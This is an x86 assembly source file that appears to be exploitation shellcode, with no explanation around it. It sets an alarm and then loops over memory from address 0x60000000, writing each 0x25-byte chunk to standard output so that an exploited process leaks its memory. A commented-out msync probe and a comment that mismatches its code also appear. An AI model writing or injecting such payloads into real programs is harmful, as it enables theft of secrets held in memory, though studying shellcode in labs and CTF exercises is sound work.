.globl main
.type main, @function

/*
 *  NOTE: write() does not crash the program
 *    we simply iterate and write thins
 * 
 * *******************/


main:
#ifndef SHELLCODE_ONLY
	mov $main, %eax;
	add $0x8, %eax;
#endif
	push $0x6000;
	pop %esi;
	add $0xb, %eax;	
	push %eax;
	ret;

	push %eax;	
	// alarm(0x10000)
	push $0x7f;
	pop %ebx;
	push $0x1b;
	pop %eax;
	int $0x80;
	// msync
	#xor %edx, %edx
	#push $0x1000;
	#pop %ecx;
	#push %esi;
	#pop %ebx;
	#shl $0x10, %ebx;
	#push $0x90;
	#pop %eax;
	#int $0x80;
	#test %eax, %eax;
	#jne again;
	
	// write(1, buf, 0x25)
	push $0x25;
	pop %edx;
	push %esi;
	pop %ecx;
	shl $0x10, %ecx;
	push $0x1;
	pop %ebx;
	push $0x4;
	pop %eax;
	int $0x80;
	inc %esi;
	pop %eax;
	jmp *%eax;

